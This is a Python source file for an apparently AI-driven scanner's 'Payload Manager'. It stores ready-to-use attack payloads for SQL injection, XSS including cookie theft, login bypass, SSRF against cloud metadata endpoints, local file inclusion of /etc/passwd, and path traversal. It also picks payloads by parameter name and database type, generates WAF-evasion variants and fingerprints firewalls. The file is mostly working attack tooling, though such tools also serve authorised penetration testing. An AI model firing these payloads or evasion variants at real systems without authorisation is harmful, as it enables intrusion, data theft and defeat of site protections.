"""
XLayer AI Payload Manager - Payload database and context-aware selection
"""

import re
from typing import List, Dict, Optional, Any
from dataclasses import dataclass
from enum import Enum
from loguru import logger


class PayloadCategory(str, Enum):
    """Categories of payloads"""
    SQLI_ERROR = "sqli_error"
    SQLI_UNION = "sqli_union"
    SQLI_BOOLEAN = "sqli_boolean"
    SQLI_TIME = "sqli_time"
    XSS_REFLECTED = "xss_reflected"
    XSS_STORED = "xss_stored"
    XSS_DOM = "xss_dom"
    AUTH_BYPASS = "auth_bypass"
    IDOR = "idor"
    SSRF = "ssrf"
    LFI = "lfi"
    RFI = "rfi"
    PATH_TRAVERSAL = "path_traversal"


class DatabaseType(str, Enum):
    """Database types for SQLi payloads"""
    MYSQL = "mysql"
    POSTGRESQL = "postgresql"
    MSSQL = "mssql"
    ORACLE = "oracle"
    SQLITE = "sqlite"
    GENERIC = "generic"


class XSSContext(str, Enum):
    """XSS injection contexts"""
    HTML_BODY = "html_body"
    HTML_ATTRIBUTE = "html_attribute"
    JAVASCRIPT = "javascript"
    URL = "url"
    CSS = "css"


@dataclass
class Payload:
    """A single payload with metadata"""
    value: str
    category: PayloadCategory
    description: str
    tags: List[str]
    encoding: Optional[str] = None
    bypass_waf: bool = False


# Context-aware payload choice: param name → preferred vuln/order
SQLI_FIRST_PARAMS = frozenset([
    "id", "user_id", "uid", "doc_id", "pid", "cid", "sid", "item_id", "order_id",
    "post_id", "article_id", "product_id", "customer_id", "account_id", "ref", "key",
])
XSS_FIRST_PARAMS = frozenset([
    "search", "name", "query", "q", "msg", "comment", "message", "text", "keyword",
    "input", "value", "title", "description", "content", "body", "feedback", "review",
])


class PayloadManager:
    """
    Manages exploit payloads with context-aware selection.
    
    Features:
    - Built-in payload database
    - Context-aware payload selection (param name + tech stack)
    - WAF bypass variants
    - Encoding support
    """
    
    def __init__(self):
        self._payloads: Dict[PayloadCategory, List[Payload]] = {}
        self._load_builtin_payloads()
    
    def _load_builtin_payloads(self):
        """Load built-in payload database"""
        
        self._payloads[PayloadCategory.SQLI_ERROR] = [
            Payload("'", PayloadCategory.SQLI_ERROR, "Single quote", ["basic", "error"]),
            Payload('"', PayloadCategory.SQLI_ERROR, "Double quote", ["basic", "error"]),
            Payload("'--", PayloadCategory.SQLI_ERROR, "Quote with comment", ["basic", "error"]),
            Payload("' OR '1'='1", PayloadCategory.SQLI_ERROR, "OR true condition", ["basic", "error"]),
            Payload("1' AND '1'='1", PayloadCategory.SQLI_ERROR, "AND true condition", ["basic", "error"]),
            Payload("1' AND '1'='2", PayloadCategory.SQLI_ERROR, "AND false condition", ["basic", "error"]),
            Payload("\\", PayloadCategory.SQLI_ERROR, "Backslash escape", ["basic", "error"]),
            Payload("' OR ''='", PayloadCategory.SQLI_ERROR, "Empty string OR", ["basic", "error"]),
        ]
        
        self._payloads[PayloadCategory.SQLI_UNION] = [
            Payload("' UNION SELECT NULL--", PayloadCategory.SQLI_UNION, "Union 1 column", ["union"]),
            Payload("' UNION SELECT NULL,NULL--", PayloadCategory.SQLI_UNION, "Union 2 columns", ["union"]),
            Payload("' UNION SELECT NULL,NULL,NULL--", PayloadCategory.SQLI_UNION, "Union 3 columns", ["union"]),
            Payload("' UNION SELECT NULL,NULL,NULL,NULL--", PayloadCategory.SQLI_UNION, "Union 4 columns", ["union"]),
            Payload("' UNION SELECT NULL,NULL,NULL,NULL,NULL--", PayloadCategory.SQLI_UNION, "Union 5 columns", ["union"]),
            Payload("' UNION SELECT version(),user(),database()--", PayloadCategory.SQLI_UNION, "MySQL info extraction", ["union", "mysql"]),
            Payload("' UNION SELECT @@version,user(),database()--", PayloadCategory.SQLI_UNION, "MySQL version", ["union", "mysql"]),
            Payload("' UNION SELECT version(),current_user,current_database()--", PayloadCategory.SQLI_UNION, "PostgreSQL info", ["union", "postgresql"]),
        ]
        
        self._payloads[PayloadCategory.SQLI_BOOLEAN] = [
            Payload("' AND 1=1--", PayloadCategory.SQLI_BOOLEAN, "Boolean true", ["boolean"]),
            Payload("' AND 1=2--", PayloadCategory.SQLI_BOOLEAN, "Boolean false", ["boolean"]),
            Payload("' AND 'a'='a", PayloadCategory.SQLI_BOOLEAN, "String comparison true", ["boolean"]),
            Payload("' AND 'a'='b", PayloadCategory.SQLI_BOOLEAN, "String comparison false", ["boolean"]),
            Payload("' AND (SELECT 1)=1--", PayloadCategory.SQLI_BOOLEAN, "Subquery true", ["boolean"]),
            Payload("' AND (SELECT 1)=2--", PayloadCategory.SQLI_BOOLEAN, "Subquery false", ["boolean"]),
        ]
        
        self._payloads[PayloadCategory.SQLI_TIME] = [
            Payload("' AND SLEEP(5)--", PayloadCategory.SQLI_TIME, "MySQL sleep 5s", ["time", "mysql"]),
            Payload("' AND SLEEP(10)--", PayloadCategory.SQLI_TIME, "MySQL sleep 10s", ["time", "mysql"]),
            Payload("'; WAITFOR DELAY '0:0:5'--", PayloadCategory.SQLI_TIME, "MSSQL delay 5s", ["time", "mssql"]),
            Payload("' AND pg_sleep(5)--", PayloadCategory.SQLI_TIME, "PostgreSQL sleep 5s", ["time", "postgresql"]),
            Payload("' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--", PayloadCategory.SQLI_TIME, "MySQL nested sleep", ["time", "mysql"]),
            Payload("1' AND BENCHMARK(10000000,MD5(1))--", PayloadCategory.SQLI_TIME, "MySQL benchmark", ["time", "mysql"]),
        ]
        
        self._payloads[PayloadCategory.XSS_REFLECTED] = [
            Payload("<script>alert('XSS')</script>", PayloadCategory.XSS_REFLECTED, "Basic script tag", ["basic", "html"]),
            Payload("<script>alert(document.domain)</script>", PayloadCategory.XSS_REFLECTED, "Domain alert", ["basic", "html"]),
            Payload("<img src=x onerror=alert('XSS')>", PayloadCategory.XSS_REFLECTED, "Img onerror", ["basic", "html"]),
            Payload("<svg onload=alert('XSS')>", PayloadCategory.XSS_REFLECTED, "SVG onload", ["basic", "html"]),
            Payload("<body onload=alert('XSS')>", PayloadCategory.XSS_REFLECTED, "Body onload", ["basic", "html"]),
            Payload("<iframe src=\"javascript:alert('XSS')\">", PayloadCategory.XSS_REFLECTED, "Iframe javascript", ["basic", "html"]),
            Payload("<input onfocus=alert('XSS') autofocus>", PayloadCategory.XSS_REFLECTED, "Input autofocus", ["basic", "html"]),
            Payload("<marquee onstart=alert('XSS')>", PayloadCategory.XSS_REFLECTED, "Marquee onstart", ["basic", "html"]),
            Payload("<details open ontoggle=alert('XSS')>", PayloadCategory.XSS_REFLECTED, "Details ontoggle", ["basic", "html"]),
            Payload("javascript:alert('XSS')", PayloadCategory.XSS_REFLECTED, "Javascript protocol", ["basic", "url"]),
            Payload("'-alert('XSS')-'", PayloadCategory.XSS_REFLECTED, "JS context break", ["basic", "javascript"]),
            Payload("';alert('XSS');//", PayloadCategory.XSS_REFLECTED, "JS string break", ["basic", "javascript"]),
            Payload("\" onmouseover=\"alert('XSS')\"", PayloadCategory.XSS_REFLECTED, "Attribute injection", ["basic", "attribute"]),
            Payload("' onfocus='alert(1)' autofocus='", PayloadCategory.XSS_REFLECTED, "Single quote attr", ["basic", "attribute"]),
        ]
        
        self._payloads[PayloadCategory.XSS_DOM] = [
            Payload("#<script>alert('XSS')</script>", PayloadCategory.XSS_DOM, "Hash-based DOM XSS", ["dom"]),
            Payload("javascript:alert(document.cookie)", PayloadCategory.XSS_DOM, "Cookie theft", ["dom"]),
            Payload("<img src=x onerror=eval(atob('YWxlcnQoJ1hTUycp'))>", PayloadCategory.XSS_DOM, "Base64 encoded", ["dom", "bypass"]),
        ]
        
        self._payloads[PayloadCategory.AUTH_BYPASS] = [
            Payload("admin'--", PayloadCategory.AUTH_BYPASS, "SQL comment bypass", ["sqli"]),
            Payload("' OR 1=1--", PayloadCategory.AUTH_BYPASS, "OR true bypass", ["sqli"]),
            Payload("admin' OR '1'='1", PayloadCategory.AUTH_BYPASS, "Admin OR bypass", ["sqli"]),
            Payload("' OR ''='", PayloadCategory.AUTH_BYPASS, "Empty string bypass", ["sqli"]),
            Payload('{"$ne": null}', PayloadCategory.AUTH_BYPASS, "NoSQL not equal", ["nosql"]),
            Payload('{"$gt": ""}', PayloadCategory.AUTH_BYPASS, "NoSQL greater than", ["nosql"]),
            Payload("admin'/*", PayloadCategory.AUTH_BYPASS, "Block comment bypass", ["sqli"]),
        ]
        
        self._payloads[PayloadCategory.IDOR] = [
            Payload("1", PayloadCategory.IDOR, "ID 1", ["numeric"]),
            Payload("0", PayloadCategory.IDOR, "ID 0", ["numeric"]),
            Payload("-1", PayloadCategory.IDOR, "Negative ID", ["numeric"]),
            Payload("999999", PayloadCategory.IDOR, "Large ID", ["numeric"]),
            Payload("../user/1", PayloadCategory.IDOR, "Path traversal ID", ["path"]),
        ]
        
        self._payloads[PayloadCategory.SSRF] = [
            Payload("http://127.0.0.1", PayloadCategory.SSRF, "Localhost", ["internal"]),
            Payload("http://localhost", PayloadCategory.SSRF, "Localhost name", ["internal"]),
            Payload("http://169.254.169.254", PayloadCategory.SSRF, "AWS metadata", ["cloud"]),
            Payload("http://169.254.169.254/latest/meta-data/", PayloadCategory.SSRF, "AWS metadata path", ["cloud"]),
            Payload("http://metadata.google.internal", PayloadCategory.SSRF, "GCP metadata", ["cloud"]),
            Payload("http://[::1]", PayloadCategory.SSRF, "IPv6 localhost", ["internal", "bypass"]),
            Payload("http://0.0.0.0", PayloadCategory.SSRF, "Zero IP", ["internal"]),
            Payload("http://0177.0.0.1", PayloadCategory.SSRF, "Octal localhost", ["internal", "bypass"]),
            Payload("http://2130706433", PayloadCategory.SSRF, "Decimal localhost", ["internal", "bypass"]),
        ]
        
        self._payloads[PayloadCategory.LFI] = [
            Payload("../../../etc/passwd", PayloadCategory.LFI, "Linux passwd", ["linux"]),
            Payload("....//....//....//etc/passwd", PayloadCategory.LFI, "Double dot bypass", ["linux", "bypass"]),
            Payload("..%2F..%2F..%2Fetc%2Fpasswd", PayloadCategory.LFI, "URL encoded", ["linux", "bypass"]),
            Payload("..\\..\\..\\windows\\system32\\drivers\\etc\\hosts", PayloadCategory.LFI, "Windows hosts", ["windows"]),
            Payload("/etc/passwd%00", PayloadCategory.LFI, "Null byte bypass", ["linux", "bypass"]),
            Payload("php://filter/convert.base64-encode/resource=index.php", PayloadCategory.LFI, "PHP filter", ["php"]),
            Payload("file:///etc/passwd", PayloadCategory.LFI, "File protocol", ["linux"]),
        ]
        
        self._payloads[PayloadCategory.PATH_TRAVERSAL] = [
            Payload("../", PayloadCategory.PATH_TRAVERSAL, "Single traversal", ["basic"]),
            Payload("..\\", PayloadCategory.PATH_TRAVERSAL, "Windows traversal", ["windows"]),
            Payload("....//", PayloadCategory.PATH_TRAVERSAL, "Double dot bypass", ["bypass"]),
            Payload("..%252f", PayloadCategory.PATH_TRAVERSAL, "Double URL encode", ["bypass"]),
            Payload("%2e%2e%2f", PayloadCategory.PATH_TRAVERSAL, "URL encoded dots", ["bypass"]),
            Payload("..%c0%af", PayloadCategory.PATH_TRAVERSAL, "UTF-8 overlong", ["bypass"]),
        ]
        
        logger.debug(f"Loaded {sum(len(p) for p in self._payloads.values())} payloads")

    def _db_type_from_tech_stack(self, tech_stack: Any) -> Optional[DatabaseType]:
        """Infer DatabaseType from tech_stack (str, dict, or iterable of strings)."""
        if tech_stack is None:
            return None
        s = set()
        if isinstance(tech_stack, str):
            s.add(tech_stack.lower())
        elif isinstance(tech_stack, dict):
            for v in tech_stack.values():
                if isinstance(v, str):
                    s.add(v.lower())
        else:
            try:
                for x in tech_stack:
                    if isinstance(x, str):
                        s.add(x.lower())
            except TypeError:
                return None
        if "mysql" in s or "mariadb" in s:
            return DatabaseType.MYSQL
        if "postgres" in s or "postgresql" in s:
            return DatabaseType.POSTGRESQL
        if "mssql" in s or "sql server" in " ".join(s):
            return DatabaseType.MSSQL
        if "oracle" in s:
            return DatabaseType.ORACLE
        if "sqlite" in s:
            return DatabaseType.SQLITE
        return None
    
    def get_payloads(
        self,
        category: PayloadCategory,
        tags: Optional[List[str]] = None,
        limit: Optional[int] = None
    ) -> List[Payload]:
        """
        Get payloads by category and optional tags
        
        Args:
            category: Payload category
            tags: Optional tags to filter by
            limit: Maximum number of payloads to return
            
        Returns:
            List of matching payloads
        """
        payloads = self._payloads.get(category, [])
        
        if tags:
            payloads = [p for p in payloads if any(t in p.tags for t in tags)]
        
        if limit:
            payloads = payloads[:limit]
        
        return payloads
    
    def get_sqli_payloads(
        self,
        db_type: DatabaseType = DatabaseType.GENERIC,
        include_time_based: bool = True,
        parameter_name: Optional[str] = None,
        tech_stack: Optional[Any] = None,
    ) -> List[Payload]:
        """Get SQL injection payloads. Context-aware: tech_stack can override db_type; param name hints (id→SQLi) used for ordering."""
        if tech_stack is not None:
            db_type = self._db_type_from_tech_stack(tech_stack) or db_type
        payloads = []
        
        payloads.extend(self.get_payloads(PayloadCategory.SQLI_ERROR))
        payloads.extend(self.get_payloads(PayloadCategory.SQLI_BOOLEAN))
        
        if db_type != DatabaseType.GENERIC:
            union_payloads = self.get_payloads(PayloadCategory.SQLI_UNION, tags=[db_type.value])
            if not union_payloads:
                union_payloads = self.get_payloads(PayloadCategory.SQLI_UNION)
            payloads.extend(union_payloads)
        else:
            payloads.extend(self.get_payloads(PayloadCategory.SQLI_UNION))
        
        if include_time_based:
            if db_type != DatabaseType.GENERIC:
                time_payloads = self.get_payloads(PayloadCategory.SQLI_TIME, tags=[db_type.value])
                if not time_payloads:
                    time_payloads = self.get_payloads(PayloadCategory.SQLI_TIME)
                payloads.extend(time_payloads)
            else:
                payloads.extend(self.get_payloads(PayloadCategory.SQLI_TIME))
        
        # parameter_name in SQLI_FIRST_PARAMS: order already good (error→boolean→union→time)
        return payloads
    
    def get_xss_payloads(
        self,
        context: XSSContext = XSSContext.HTML_BODY,
        parameter_name: Optional[str] = None,
    ) -> List[Payload]:
        """Get XSS payloads for specific context. Context-aware: search/name/query → reflective first."""
        payloads = []
        
        context_tags = {
            XSSContext.HTML_BODY: ["html"],
            XSSContext.HTML_ATTRIBUTE: ["attribute"],
            XSSContext.JAVASCRIPT: ["javascript"],
            XSSContext.URL: ["url"],
            XSSContext.CSS: ["css"]
        }
        
        tags = context_tags.get(context, ["html"])
        
        payloads.extend(self.get_payloads(PayloadCategory.XSS_REFLECTED, tags=tags))
        
        if not payloads:
            payloads.extend(self.get_payloads(PayloadCategory.XSS_REFLECTED, tags=["basic"]))
        
        payloads.extend(self.get_payloads(PayloadCategory.XSS_DOM))
        
        # Param name search/name/query → put reflective (basic/html) first
        if parameter_name and (parameter_name.lower() in XSS_FIRST_PARAMS):
            reflective = [p for p in payloads if any(t in p.tags for t in ("basic", "html"))]
            others = [p for p in payloads if p not in reflective]
            payloads = reflective + others
        
        return payloads
    
    def get_payloads_for_vuln_type(
        self,
        vuln_type: str,
        parameter_name: Optional[str] = None,
        tech_stack: Optional[Any] = None,
    ) -> List[Payload]:
        """One entry point for context-aware payloads (param + tech). Returns ordered list for vuln_type."""
        vt = (vuln_type or "").lower()
        if vt in ("sqli", "sql_injection"):
            return self.get_sqli_payloads(
                db_type=DatabaseType.GENERIC,
                include_time_based=True,
                parameter_name=parameter_name,
                tech_stack=tech_stack,
            )
        if vt in ("xss", "xss_reflected", "xss_stored", "xss_dom"):
            return self.get_xss_payloads(parameter_name=parameter_name)
        if vt in ("ssrf",):
            return self.get_ssrf_payloads(include_cloud=True)
        if vt in ("lfi", "path_traversal"):
            return self.get_lfi_payloads(os_type="linux")
        if vt in ("auth", "auth_bypass"):
            return self.get_auth_bypass_payloads()
        return []
    
    def get_auth_bypass_payloads(self) -> List[Payload]:
        """Get authentication bypass payloads"""
        return self.get_payloads(PayloadCategory.AUTH_BYPASS)
    
    def get_ssrf_payloads(self, include_cloud: bool = True) -> List[Payload]:
        """Get SSRF payloads"""
        payloads = self.get_payloads(PayloadCategory.SSRF, tags=["internal"])
        
        if include_cloud:
            payloads.extend(self.get_payloads(PayloadCategory.SSRF, tags=["cloud"]))
        
        return payloads
    
    def get_lfi_payloads(self, os_type: str = "linux") -> List[Payload]:
        """Get LFI payloads for specific OS"""
        payloads = self.get_payloads(PayloadCategory.LFI, tags=[os_type])
        payloads.extend(self.get_payloads(PayloadCategory.LFI, tags=["bypass"]))
        payloads.extend(self.get_payloads(PayloadCategory.PATH_TRAVERSAL))
        return payloads
    
    def encode_payload(self, payload: str, encoding: str) -> str:
        """Encode payload with specified encoding"""
        import urllib.parse
        import base64 as b64
        
        if encoding == "url":
            return urllib.parse.quote(payload)
        elif encoding == "double_url":
            return urllib.parse.quote(urllib.parse.quote(payload))
        elif encoding == "base64":
            return b64.b64encode(payload.encode()).decode()
        elif encoding == "html":
            return "".join(f"&#{ord(c)};" for c in payload)
        elif encoding == "unicode":
            return "".join(f"\\u{ord(c):04x}" for c in payload)
        else:
            return payload
    
    def get_waf_bypass_variants(self, payload: str, category: Optional[str] = None) -> List[str]:
        """
        Generate comprehensive WAF bypass variants of a payload.

        Strategies:
        - Space substitution (comments, tabs, newlines, form-feed)
        - Case variation (upper, lower, mixed)
        - Encoding (URL, double URL, HTML entities, Unicode)
        - SQL comment injection
        - Keyword splitting via inline comments
        - Null byte and whitespace tricks
        - HTTP parameter pollution hint variants
        """
        variants = [payload]

        # --- Space substitution ---
        for space_sub in ["/**/", "%09", "%0a", "%0d", "%0c", "%a0", "+"]:
            variants.append(payload.replace(" ", space_sub))

        # --- Case variation ---
        variants.append(payload.upper())
        variants.append(payload.lower())
        # Alternating case
        variants.append("".join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(payload)))
        # Random-ish case (every 3rd upper)
        variants.append("".join(c.upper() if i % 3 == 0 else c.lower() for i, c in enumerate(payload)))

        # --- Encoding variants ---
        variants.append(self.encode_payload(payload, "url"))
        variants.append(self.encode_payload(payload, "double_url"))
        variants.append(self.encode_payload(payload, "html"))

        # --- SQL-specific bypasses ---
        if any(kw in payload.upper() for kw in ["SELECT", "UNION", "FROM", "WHERE", "AND", "OR", "INSERT"]):
            # Inline comment splitting for keywords
            for kw in ["SELECT", "UNION", "FROM", "WHERE", "AND", "OR", "INSERT", "UPDATE", "DELETE", "DROP"]:
                if kw in payload.upper():
                    split = kw[:2] + "/**/" + kw[2:]
                    variants.append(payload.upper().replace(kw, split))

            # MySQL specific - use backticks
            variants.append(payload.replace("'", "`"))
            # Use -- - comment style
            variants.append(payload.replace("--", "-- -"))
            # Scientific notation for numbers
            variants.append(payload.replace(" 1=1", " 1e0=1e0"))

        # --- XSS-specific bypasses ---
        if "<script" in payload.lower() or "onerror" in payload.lower() or "onload" in payload.lower():
            # Tag case mutation
            variants.append(payload.replace("<script>", "<ScRiPt>").replace("</script>", "</ScRiPt>"))
            variants.append(payload.replace("<script>", "<SCRIPT>").replace("</script>", "</SCRIPT>"))
            # Null byte injection
            variants.append(payload.replace("<script>", "<scr\x00ipt>"))
            # Tab/newline inside tag
            variants.append(payload.replace("<script>", "<scr\tipt>"))
            variants.append(payload.replace("alert(", "alert\x28"))
            # Base64 encoded XSS via data URI
            import base64
            b64 = base64.b64encode(b"alert(1)").decode()
            variants.append(f'<img src=x onerror=eval(atob("{b64}"))>')
            # SVG based
            variants.append('<svg/onload=alert(1)>')
            # HTML entity encoding of < and >
            variants.append(payload.replace("<", "&#60;").replace(">", "&#62;"))

        # --- Path traversal bypasses ---
        if "../" in payload or "..\\" in payload:
            variants.append(payload.replace("../", "....//"))
            variants.append(payload.replace("../", "..%2f"))
            variants.append(payload.replace("../", "%2e%2e%2f"))
            variants.append(payload.replace("../", "..%252f"))
            variants.append(payload.replace("../", "..%c0%af"))
            variants.append(payload.replace("../", "%2e%2e/"))

        # --- Header injection hints ---
        # (for use in header-based WAF bypass)
        header_variants = [
            payload,  # original
        ]

        # Remove exact duplicates but preserve order
        seen = set()
        unique = []
        for v in variants:
            if v not in seen and v != payload:
                seen.add(v)
                unique.append(v)

        return [payload] + unique

    def detect_waf(self, response_body: str, response_headers: Dict[str, str]) -> Optional[str]:
        """
        Detect WAF presence from response body and headers.
        Returns WAF name if detected, None otherwise.
        """
        waf_signatures = {
            "Cloudflare": [
                "cloudflare", "cf-ray", "__cfduid", "attention required! | cloudflare"
            ],
            "AWS WAF": [
                "aws", "x-amzn-requestid", "x-amz-cf-id", "request blocked"
            ],
            "Akamai": [
                "akamai", "akamaighost", "ak_bmsc"
            ],
            "Imperva": [
                "incapsula", "visid_incap", "incap_ses"
            ],
            "ModSecurity": [
                "mod_security", "modsecurity", "this error was generated by mod_security"
            ],
            "Sucuri": [
                "sucuri", "x-sucuri-id", "sucuri cloudproxy"
            ],
            "F5 BIG-IP": [
                "bigip", "f5", "ts=", "tsxxxxxxxx"
            ],
            "Barracuda": [
                "barracuda", "barra_counter_session"
            ],
            "Generic": [
                "access denied", "forbidden", "your request has been blocked",
                "security violation", "attack detected", "bad request",
                "illegal request", "web application firewall"
            ]
        }

        combined = response_body.lower() + " " + " ".join(
            f"{k.lower()}:{v.lower()}" for k, v in response_headers.items()
        )

        for waf_name, signatures in waf_signatures.items():
            if any(sig in combined for sig in signatures):
                logger.warning(f"WAF detected: {waf_name}")
                return waf_name

        return None

    def get_adaptive_payloads(
        self,
        category: PayloadCategory,
        waf_detected: Optional[str] = None,
        max_variants: int = 5
    ) -> List[Payload]:
        """
        Get payloads with WAF-aware bypass variants.
        If WAF is detected, returns bypass-tagged payloads first,
        then generates variants of base payloads.
        """
        base_payloads = self.get_payloads(category)

        if not waf_detected:
            return base_payloads

        # Prefer bypass-tagged payloads
        bypass_first = [p for p in base_payloads if p.bypass_waf or "bypass" in p.tags]
        normal = [p for p in base_payloads if p not in bypass_first]
        ordered = bypass_first + normal

        # Generate WAF bypass variants for top payloads
        result = []
        for p in ordered[:max_variants]:
            result.append(p)
            for variant_value in self.get_waf_bypass_variants(p.value)[:3]:
                result.append(Payload(
                    value=variant_value,
                    category=p.category,
                    description=f"{p.description} [WAF bypass variant]",
                    tags=p.tags + ["waf_bypass"],
                    bypass_waf=True
                ))

        return result
